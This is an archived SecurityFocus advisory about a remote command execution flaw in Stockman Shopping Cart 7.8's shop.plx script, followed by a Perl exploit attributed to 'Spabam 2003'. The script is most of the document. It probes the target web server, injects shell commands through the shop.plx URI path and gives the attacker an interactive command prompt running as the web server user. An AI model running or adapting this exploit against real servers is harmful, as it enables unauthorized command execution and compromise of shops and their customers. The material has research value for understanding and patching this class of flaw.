source: http://www.securityfocus.com/bid/7485/info

Stockman Shopping Cart has been reported prone to a remote command execution vulnerability. This issue presents itself in the 'shop.plx' script.

The problem results from a lack of sufficient sanitization performed on user supplied URI parameters to the 'shop.plx' script. An attacker may exploit this vulnerability to execute arbitrary commands in the context of the web server hosting the vulnerable script.

It should be noted that although this vulnerability has been reported to affect Stockman Shopping Cart Version 7.8 other versions might also be affected.

The precise technical details of this vulnerability are currently unknown. This BID will be updated, as further information is available. 

#####################################################
# Stockman Shopping Cart exploit
# Spawn bash style Shell with webserver uid
# http://www.securityfocus.com/bid/7485
# Spabam 2003 PRIV8 code
# #hackarena irc.brasnet.org
# This Script is currently under development
#####################################################
use strict;
use IO::Socket;
my $host;
my $port;
my $command;
my $url;
my @results;
my $probe;
my @U;
my $shit;
$U[1] = "/cgi-bin/shop.plx/SID=313130332/page=;";
&intro;
&scan;
&choose;
&command;
&exit;
sub intro {
&help;
&host;
&server;
sleep 3;
};
sub host {
print "\nHost or IP : ";
$host=<STDIN>;
chomp $host;
if ($host eq ""){$host="127.0.0.1"};
$shit="|";
$port="80";
chomp $port;
if ($port =~/\D/ ){$port="80"};
if ($port eq "" ) {$port = "80"};
};
sub server {
my $X;
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
$probe = "string";
my $output;
my $webserver = "something";
&connect;
for ($X=0; $X<=10; $X++){
	$output = $results[$X];
	if (defined $output){
	if ($output =~/Apache/){ $webserver = "Apache" };
	};
};
if ($webserver ne "Apache"){
my $choice = "y";
chomp $choice;
if ($choice =~/N/i) {&exit};
            }else{
print "\n\nOK";
	};		
};  
sub scan {
my $status = "not_vulnerable";
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
my $loop;
my $output;
my $flag;
$command="dir";
for ($loop=1; $loop < @U; $loop++) { 
$flag = "0";
$url = $U[$loop];
$probe = "scan";
&connect;
foreach $output (@results){
if ($output =~ /Directory/) {
                              $flag = "1";
			      $status = "vulnerable";
			      };
	};
if ($flag eq "0") { 
}else{
print "\a\a\a\n$host VULNERABLE TO CPANEL 5 $loop !!!";
     };
};
if ($status eq "not_vulnerable"){

				};
};
sub choose {
my $choice="0";
chomp $choice;
if ($choice > @U){ &choose };
if ($choice =~/\D/g ){ &choose };
if ($choice == 0){ &other };
$url = $U[$choice];
};
sub other {
my $other = "/cgi-bin/shop.plx/SID=313130332/page=;";
chomp $other;
$U[0] = $other;
};
sub command {
while ($command !~/quit/i) {
print "\n[$host]\$ ";
$command = <STDIN>;
chomp $command;
if ($command =~/quit/i) { &exit };
if ($command =~/url/i) { &choose }; 
if ($command =~/scan/i) { &scan };
if ($command =~/help/i) { &help };
$command =~ s/\s/+/g; 
$probe = "command";
if ($command !~/quit|url|scan|help/) {&connect};
};
&exit;
};  
sub connect {
my $connection = IO::Socket::INET->new (
				Proto => "tcp",
				PeerAddr => "$host",
				PeerPort => "$port",
				) or die "\nSorry UNABLE TO CONNECT To $host On Port $port.\n";
$connection -> autoflush(1);
if ($probe =~/command|scan/){
print $connection "GET $url$command$shiz HTTP/1.1\r\nHost: $host\r\n\r\n";
}elsif ($probe =~/string/) {
print $connection "HEAD / HTTP/1.1\r\nHost: $host\r\n\r\n";
};

while ( <$connection> ) { 
			@results = <$connection>;
			 };
close $connection;
if ($probe eq "command"){ &output };
if ($probe eq "string"){ &output };
};  
sub output{
my $display;
if ($probe eq "string") {
			my $X;
			for ($X=0; $X<=10; $X++) {
			$display = $results[$X];
			if (defined $display){print "$display";};
			sleep 1;
				};
			}else{
			foreach $display (@results){
			    print "$display";
			    sleep 1;
				};
                          };
};  
sub exit{
print "\n\n\n
SPABAM 2003.";
print "\n\n\n";
exit;
};
sub help {
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
print "\n
        StockmanShop.pl v1.1 by SPABAM 2003";
print "\n
";
print "\n Dr. Jay Stockman Stockman Shopping Cart 7.8 Exploit WHICH SPAWN A BASH STYLE SHELL";
print "\n
note.. web directory is normally /var/www/html";
print "\n";
print "\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)";
print "\n\n\n\n\n\n\n\n\n\n\n\n";
};